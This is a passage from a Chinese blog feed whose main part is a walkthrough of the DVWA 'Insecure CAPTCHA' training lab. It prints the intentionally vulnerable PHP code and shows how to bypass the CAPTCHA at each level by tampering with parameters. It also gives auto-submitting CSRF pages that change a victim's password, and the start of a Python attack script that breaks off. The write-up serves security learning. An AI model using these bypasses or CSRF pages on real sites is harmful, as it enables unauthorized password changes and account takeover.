def</td></tr><tr><td>(…)</td><td>被括起来的表达式将作为分组，从表达式左边开始每遇到一个分组的左括号，编号+1分组表达式作为一个整体，可以后接数量词，表达式中或运算符仅在该组中有效</td><td>(abc){2}  a(123或456)c</td><td>abcabc a123c,a456c</td></tr></tbody></table><h2 id="贪婪模式和非贪婪模式"><a href="#贪婪模式和非贪婪模式" class="headerlink" title="贪婪模式和非贪婪模式"></a>贪婪模式和非贪婪模式</h2><p>正则表达式通常用于在文本中查找匹配的字符串。Python里的数量词默认是贪婪的，意思是总是尝试匹配尽可能多的字符；非贪婪的则相反，总是尝试匹配尽可能少的字符。</p><p>例如：正则表达式”ab*“如果用于查找”abbbc”，将匹配到”abbb”。而如果使用非贪婪方法(在数量词后面加上?，则使用非贪婪方法匹配)，如”ab*?”，将找到”a”</p>]]></content>
    
    <summary type="html">
    
      Python学习笔记
    
    </summary>
    
      <category term="Python学习笔记" scheme="https://Foxgrin.github.io/categories/Python%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="Python" scheme="https://Foxgrin.github.io/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>dvwa-Insecure CAPTCHA</title>
    <link href="https://Foxgrin.github.io//posts/51335/"/>
    <id>https://Foxgrin.github.io//posts/51335/</id>
    <published>2018-07-16T06:10:00.000Z</published>
    <updated>2018-07-16T08:02:16.296Z</updated>
    
    <content type="html"><![CDATA[<p>总结了dvwa中关于不安全的验证码的关卡<a id="more"></a></p><h2 id="Low"><a href="#Low" class="headerlink" title="Low"></a>Low</h2><p>代码如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line"></span><br><span class="line">if( isset( $_POST[ &apos;Change&apos; ] ) &amp;&amp; ( $_POST[ &apos;step&apos; ] == &apos;1&apos; ) ) &#123; </span><br><span class="line">    // Hide the CAPTCHA form </span><br><span class="line">    $hide_form = true; </span><br><span class="line"></span><br><span class="line">    // Get input </span><br><span class="line">    $pass_new  = $_POST[ &apos;password_new&apos; ]; </span><br><span class="line">    $pass_conf = $_POST[ &apos;password_conf&apos; ]; </span><br><span class="line"></span><br><span class="line">    // Check CAPTCHA from 3rd party </span><br><span class="line">    $resp = recaptcha_check_answer( $_DVWA[ &apos;recaptcha_private_key&apos; ], </span><br><span class="line">        $_SERVER[ &apos;REMOTE_ADDR&apos; ], </span><br><span class="line">        $_POST[ &apos;recaptcha_challenge_field&apos; ], </span><br><span class="line">        $_POST[ &apos;recaptcha_response_field&apos; ] ); </span><br><span class="line"></span><br><span class="line">    // Did the CAPTCHA fail? </span><br><span class="line">    if( !$resp-&gt;is_valid ) &#123; </span><br><span class="line">        // What happens when the CAPTCHA was entered incorrectly </span><br><span class="line">        $html     .= &quot;&lt;pre&gt;&lt;br /&gt;The CAPTCHA was incorrect. Please try again.&lt;/pre&gt;&quot;; </span><br><span class="line">        $hide_form = false; </span><br><span class="line">        return; </span><br><span class="line">    &#125; </span><br><span class="line">    else &#123; </span><br><span class="line">        // CAPTCHA was correct. Do both new passwords match? </span><br><span class="line">        if( $pass_new == $pass_conf ) &#123; </span><br><span class="line">            // Show next stage for the user </span><br><span class="line">            echo &quot; </span><br><span class="line">                &lt;pre&gt;&lt;br /&gt;You passed the CAPTCHA! Click the button to confirm your changes.&lt;br /&gt;&lt;/pre&gt; </span><br><span class="line">                &lt;form action=\&quot;#\&quot; method=\&quot;POST\&quot;&gt; </span><br><span class="line">                    &lt;input type=\&quot;hidden\&quot; name=\&quot;step\&quot; value=\&quot;2\&quot; /&gt; </span><br><span class="line">                    &lt;input type=\&quot;hidden\&quot; name=\&quot;password_new\&quot; value=\&quot;&#123;$pass_new&#125;\&quot; /&gt; </span><br><span class="line">                    &lt;input type=\&quot;hidden\&quot; name=\&quot;password_conf\&quot; value=\&quot;&#123;$pass_conf&#125;\&quot; /&gt; </span><br><span class="line">                    &lt;input type=\&quot;submit\&quot; name=\&quot;Change\&quot; value=\&quot;Change\&quot; /&gt; </span><br><span class="line">                &lt;/form&gt;&quot;; </span><br><span class="line">        &#125; </span><br><span class="line">        else &#123; </span><br><span class="line">            // Both new passwords do not match. </span><br><span class="line">            $html     .= &quot;&lt;pre&gt;Both passwords must match.&lt;/pre&gt;&quot;; </span><br><span class="line">            $hide_form = false; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">if( isset( $_POST[ &apos;Change&apos; ] ) &amp;&amp; ( $_POST[ &apos;step&apos; ] == &apos;2&apos; ) ) &#123; </span><br><span class="line">    // Hide the CAPTCHA form </span><br><span class="line">    $hide_form = true; </span><br><span class="line"></span><br><span class="line">    // Get input </span><br><span class="line">    $pass_new  = $_POST[ &apos;password_new&apos; ]; </span><br><span class="line">    $pass_conf = $_POST[ &apos;password_conf&apos; ]; </span><br><span class="line"></span><br><span class="line">    // Check to see if both password match </span><br><span class="line">    if( $pass_new == $pass_conf ) &#123; </span><br><span class="line">        // They do! </span><br><span class="line">        $pass_new = mysql_real_escape_string( $pass_new ); </span><br><span class="line">        $pass_new = md5( $pass_new ); </span><br><span class="line"></span><br><span class="line">        // Update database </span><br><span class="line">        $insert = &quot;UPDATE `users` SET password = &apos;$pass_new&apos; WHERE user = &apos;&quot; . dvwaCurrentUser() . &quot;&apos;;&quot;; </span><br><span class="line">        $result = mysql_query( $insert ) or die( &apos;&lt;pre&gt;&apos; . mysql_error() . &apos;&lt;/pre&gt;&apos; ); </span><br><span class="line"></span><br><span class="line">        // Feedback for the end user </span><br><span class="line">        echo &quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;; </span><br><span class="line">    &#125; </span><br><span class="line">    else &#123; </span><br><span class="line">        // Issue with the passwords matching </span><br><span class="line">        echo &quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;; </span><br><span class="line">        $hide_form = false; </span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    mysql_close(); </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>代码很长，但是我们并不需要所有的代码，关键代码在于服务器的两个执行流程，首先会使用Google提供reCAPTCHA服务，这个服务会产生一个验证码(PS:访问到这个验证码需要翻墙，这里没有翻墙，所以显示不出验证码，但不影响我们的测试)，待用户输入验证码之后调用一个recaptcha_check_answer函数检查用户输入的正确性，该函数具体语法如下：</p><p><em>recaptcha_check_answer($privkey,$remoteip, $challenge,$response)</em> </p><p>参数$privkey是服务器申请的private key，$remoteip是用户的ip，$challenge是recaptcha_challenge_field字段的值，来自前端页面 ，$response是recaptcha_response_field字段的值。函数返回ReCaptchaResponse class的实例，ReCaptchaResponse类有2个属性 ：$is_valid是布尔型的，表示校验是否有效，$error是返回的错误代码。</p><p>若校验成功，服务器会返回一个修改密码的表单，待用户修改密码</p><p>那么就有个疑问，是不是一定要通过输入正确的验证码才能修改得了密码呢，服务器的意思虽然是这样，但是我们仔细观察源代码，发现了一个很关键的参数$_POST[‘step’]，服务器只是根据这个参数的值来分别执行校验和修改密码的两个流程，说到这里，就很明白了，我们只需要修改step的值为2，就能轻松的跳过校验过程，所以说这个验证码是不安全的，或者说这是一个不安全的校验过程</p><p>我们利用burp抓包修改step值</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-Insecure-CAPTCHA/1.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-Insecure-CAPTCHA/2.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>成功修改密码为admin</p><p>还可以利用CSRF攻击的原理诱骗受害者访问一个攻击页面，攻击页面伪造请求给服务器修改密码</p><p>攻击页面代码如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;title&gt;test&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body onload=&quot;document.getElementById(&apos;transfer&apos;).submit()&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;form id=&apos;transfer&apos; method=&apos;post&apos; action=&quot;http://127.0.0.1/dvwa/vulnerabilities/captcha/&quot;&gt;</span><br><span class="line">&lt;input type=&apos;hidden&apos; name=&apos;step&apos; value=&apos;2&apos;&gt;</span><br><span class="line">&lt;input type=&apos;hidden&apos; name=&apos;password_new&apos; value=&apos;password&apos;&gt;</span><br><span class="line">&lt;input type=&apos;hidden&apos; name=&apos;password_conf&apos; value=&apos;password&apos;&gt;</span><br><span class="line">&lt;input type=&apos;hidden&apos; name=&apos;Change&apos; value=&apos;Change&apos;&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>受害者访问攻击页面，最终跳转到修改密码成功的页面，缺点就是会被受害者察觉到密码被修改了</p><h2 id="Medium"><a href="#Medium" class="headerlink" title="Medium"></a>Medium</h2><p>代码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_POST[ <span class="string">'Change'</span> ] ) &amp;&amp; ( $_POST[ <span class="string">'step'</span> ] == <span class="string">'1'</span> ) ) &#123; </span><br><span class="line">    <span class="comment">// Hide the CAPTCHA form </span></span><br><span class="line">    $hide_form = <span class="keyword">true</span>; </span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get input </span></span><br><span class="line">    $pass_new  = $_POST[ <span class="string">'password_new'</span> ]; </span><br><span class="line">    $pass_conf = $_POST[ <span class="string">'password_conf'</span> ]; </span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check CAPTCHA from 3rd party </span></span><br><span class="line">    $resp = recaptcha_check_answer( $_DVWA[ <span class="string">'recaptcha_private_key'</span> ], </span><br><span class="line">        $_SERVER[ <span class="string">'REMOTE_ADDR'</span> ], </span><br><span class="line">        $_POST[ <span class="string">'recaptcha_challenge_field'</span> ], </span><br><span class="line">        $_POST[ <span class="string">'recaptcha_response_field'</span> ] ); </span><br><span class="line"></span><br><span class="line">    <span class="comment">// Did the CAPTCHA fail? </span></span><br><span class="line">    <span class="keyword">if</span>( !$resp-&gt;is_valid ) &#123; </span><br><span class="line">        <span class="comment">// What happens when the CAPTCHA was entered incorrectly </span></span><br><span class="line">        $html     .= <span class="string">"&lt;pre&gt;&lt;br /&gt;The CAPTCHA was incorrect. Please try again.&lt;/pre&gt;"</span>; </span><br><span class="line">        $hide_form = <span class="keyword">false</span>; </span><br><span class="line">        <span class="keyword">return</span>; </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span> &#123; </span><br><span class="line">        <span class="comment">// CAPTCHA was correct. Do both new passwords match? </span></span><br><span class="line">        <span class="keyword">if</span>( $pass_new == $pass_conf ) &#123; </span><br><span class="line">            <span class="comment">// Show next stage for the user </span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">" </span></span><br><span class="line"><span class="string">                &lt;pre&gt;&lt;br /&gt;You passed the CAPTCHA! Click the button to confirm your changes.&lt;br /&gt;&lt;/pre&gt; </span></span><br><span class="line"><span class="string">                &lt;form action=\"#\" method=\"POST\"&gt; </span></span><br><span class="line"><span class="string">                    &lt;input type=\"hidden\" name=\"step\" value=\"2\" /&gt; </span></span><br><span class="line"><span class="string">                    &lt;input type=\"hidden\" name=\"password_new\" value=\"&#123;$pass_new&#125;\" /&gt; </span></span><br><span class="line"><span class="string">                    &lt;input type=\"hidden\" name=\"password_conf\" value=\"&#123;$pass_conf&#125;\" /&gt; </span></span><br><span class="line"><span class="string">                    &lt;input type=\"hidden\" name=\"passed_captcha\" value=\"true\" /&gt; </span></span><br><span class="line"><span class="string">                    &lt;input type=\"submit\" name=\"Change\" value=\"Change\" /&gt; </span></span><br><span class="line"><span class="string">                &lt;/form&gt;"</span>; </span><br><span class="line">        &#125; </span><br><span class="line">        <span class="keyword">else</span> &#123; </span><br><span class="line">            <span class="comment">// Both new passwords do not match. </span></span><br><span class="line">            $html     .= <span class="string">"&lt;pre&gt;Both passwords must match.&lt;/pre&gt;"</span>; </span><br><span class="line">            $hide_form = <span class="keyword">false</span>; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_POST[ <span class="string">'Change'</span> ] ) &amp;&amp; ( $_POST[ <span class="string">'step'</span> ] == <span class="string">'2'</span> ) ) &#123; </span><br><span class="line">    <span class="comment">// Hide the CAPTCHA form </span></span><br><span class="line">    $hide_form = <span class="keyword">true</span>; </span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get input </span></span><br><span class="line">    $pass_new  = $_POST[ <span class="string">'password_new'</span> ]; </span><br><span class="line">    $pass_conf = $_POST[ <span class="string">'password_conf'</span> ]; </span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check to see if they did stage 1 </span></span><br><span class="line">    <span class="keyword">if</span>( !$_POST[ <span class="string">'passed_captcha'</span> ] ) &#123; </span><br><span class="line">        $html     .= <span class="string">"&lt;pre&gt;&lt;br /&gt;You have not passed the CAPTCHA.&lt;/pre&gt;"</span>; </span><br><span class="line">        $hide_form = <span class="keyword">false</span>; </span><br><span class="line">        <span class="keyword">return</span>; </span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check to see if both password match </span></span><br><span class="line">    <span class="keyword">if</span>( $pass_new == $pass_conf ) &#123; </span><br><span class="line">        <span class="comment">// They do! </span></span><br><span class="line">        $pass_new = mysql_real_escape_string( $pass_new ); </span><br><span class="line">        $pass_new = md5( $pass_new ); </span><br><span class="line"></span><br><span class="line">        <span class="comment">// Update database </span></span><br><span class="line">        $insert = <span class="string">"UPDATE `users` SET password = '$pass_new' WHERE user = '"</span> . dvwaCurrentUser() . <span class="string">"';"</span>; </span><br><span class="line">        $result = mysql_query( $insert ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">'&lt;pre&gt;'</span> . mysql_error() . <span class="string">'&lt;/pre&gt;'</span> ); </span><br><span class="line"></span><br><span class="line">        <span class="comment">// Feedback for the end user </span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;Password Changed.&lt;/pre&gt;"</span>; </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span> &#123; </span><br><span class="line">        <span class="comment">// Issue with the passwords matching </span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;Passwords did not match.&lt;/pre&gt;"</span>; </span><br><span class="line">        $hide_form = <span class="keyword">false</span>; </span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    mysql_close(); </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>相较于上一关，这里多了一个对passed_captcha参数的验证，这个参数是通过用户输入正确的验证码后自动提交的一个参数，当然我们也可以利用burp自己构造</p><p>老规矩先抓包</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-Insecure-CAPTCHA/3.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>修改step参数，并且增加passed_captcha参数</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-Insecure-CAPTCHA/4.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>修改密码成功</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-Insecure-CAPTCHA/5.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>同样的我们依然可以伪造CSRF攻击页面，代码如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;title&gt;attack-medium&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;form id=&apos;transfer&apos; method=&apos;post&apos; action=&apos;http://127.0.0.1/dvwa/vulnerabilities/captcha/&apos;&gt;</span><br><span class="line">&lt;input type=&apos;hidden&apos; name=&apos;password_new&apos; value=&apos;password&apos;&gt;</span><br><span class="line">&lt;input type=&apos;hidden&apos; name=&apos;password_conf&apos; value=&apos;password&apos;&gt;</span><br><span class="line">&lt;input type=&apos;hidden&apos; name=&apos;passed_captcha&apos; value=&apos;true&apos;&gt;</span><br><span class="line">&lt;input type=&apos;hidden&apos; name=&apos;step&apos; value=&apos;2&apos;&gt;</span><br><span class="line">&lt;input type=&apos;hidden&apos; name=&apos;Change&apos; value=&apos;Change&apos;&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line"></span><br><span class="line">&lt;script type=&quot;text/javascript&quot;&gt;</span><br><span class="line">var test=document.getElementById(&apos;transfer&apos;);</span><br><span class="line">test.submit();</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><h2 id="High"><a href="#High" class="headerlink" title="High"></a>High</h2><p>代码如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if( isset( $_POST[ &apos;Change&apos; ] ) ) &#123;</span><br><span class="line">// Hide the CAPTCHA form</span><br><span class="line">$hide_form = true;</span><br><span class="line"></span><br><span class="line">// Get input</span><br><span class="line">$pass_new  = $_POST[ &apos;password_new&apos; ];</span><br><span class="line">$pass_conf = $_POST[ &apos;password_conf&apos; ];</span><br><span class="line"></span><br><span class="line">// Check CAPTCHA from 3rd party</span><br><span class="line">$resp = recaptcha_check_answer(</span><br><span class="line">$_DVWA[ &apos;recaptcha_private_key&apos; ],</span><br><span class="line">$_POST[&apos;g-recaptcha-response&apos;]</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">if (</span><br><span class="line">$resp || </span><br><span class="line">(</span><br><span class="line">$_POST[ &apos;g-recaptcha-response&apos; ] == &apos;hidd3n_valu3&apos;</span><br><span class="line">&amp;&amp; $_SERVER[ &apos;HTTP_USER_AGENT&apos; ] == &apos;reCAPTCHA&apos;</span><br><span class="line">)</span><br><span class="line">)&#123;</span><br><span class="line">// CAPTCHA was correct. Do both new passwords match?</span><br><span class="line">if ($pass_new == $pass_conf) &#123;</span><br><span class="line">$pass_new = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $pass_new ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));</span><br><span class="line">$pass_new = md5( $pass_new );</span><br><span class="line"></span><br><span class="line">// Update database</span><br><span class="line">$insert = &quot;UPDATE `users` SET password = &apos;$pass_new&apos; WHERE user = &apos;&quot; . dvwaCurrentUser() . &quot;&apos; LIMIT 1;&quot;;</span><br><span class="line">$result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $insert ) or die( &apos;&lt;pre&gt;&apos; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &apos;&lt;/pre&gt;&apos; );</span><br><span class="line"></span><br><span class="line">// Feedback for user</span><br><span class="line">$html .= &quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;;</span><br><span class="line"></span><br><span class="line">&#125; else &#123;</span><br><span class="line">// Ops. Password mismatch</span><br><span class="line">$html     .= &quot;&lt;pre&gt;Both passwords must match.&lt;/pre&gt;&quot;;</span><br><span class="line">$hide_form = false;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125; else &#123;</span><br><span class="line">// What happens when the CAPTCHA was entered incorrectly</span><br><span class="line">$html     .= &quot;&lt;pre&gt;&lt;br /&gt;The CAPTCHA was incorrect. Please try again.&lt;/pre&gt;&quot;;</span><br><span class="line">$hide_form = false;</span><br><span class="line">return;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// Generate Anti-CSRF token</span><br><span class="line">generateSessionToken();</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>这关没有了对step参数的检测，关键检测点在于语句：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">if (</span><br><span class="line">$resp || </span><br><span class="line">(</span><br><span class="line">$_POST[ &apos;g-recaptcha-response&apos; ] == &apos;hidd3n_valu3&apos;</span><br><span class="line">&amp;&amp; $_SERVER[ &apos;HTTP_USER_AGENT&apos; ] == &apos;reCAPTCHA&apos;</span><br><span class="line">)</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>如果这个if语句执行不了，那么就验证失败，无法修改密码，所以我们必须让这个if语句执行，也就是里面的逻辑语句为真，而里面的逻辑语句是由两个逻辑语句通过 || 拼接成的，所以我们只需要让其中一个逻辑语句为真，条件就可以成立，再看里面检测的参数，$resp参数明显是我们不可控的，所以我们只要将重点放在参数g-recaptcha-response和参数HTTP_USER_AGENT上面就行了，要让if语句执行，就控制参数g-recaptcha-response值为hidd3n_valu3，请求头的user_agent为reCAPTCHA</p><p>依然是抓包</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-Insecure-CAPTCHA/6.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>然后修改参数g-recaptcha-response和参数HTTP_USER_AGENT</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-Insecure-CAPTCHA/7.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>修改成功</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-Insecure-CAPTCHA/8.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>由于无法用javascript代码修改user_agent参数，所以无法用CSRF原理攻击</p><p>最后附上本关修改密码的python脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url=<span class="string">"http://127.0.0.1/dvwa/vulnerabilities/captcha/"</span></span><br><span class="line">header=&#123;</span><br><span class="line">    <span class="string">'Host'</span>: <span class="string">'127.0.0.1'</span>,</span><br><span class="line">    <span class="string">'Content-Length'</span>: <span class="string">'103'</span>,</span><br><span class="line">    <span class="string">'Cache-Control'</span>: <span class="string">'max-age=0'</span>,</span><br><span class="line">    <span class="string">'Origin'</span>: <span 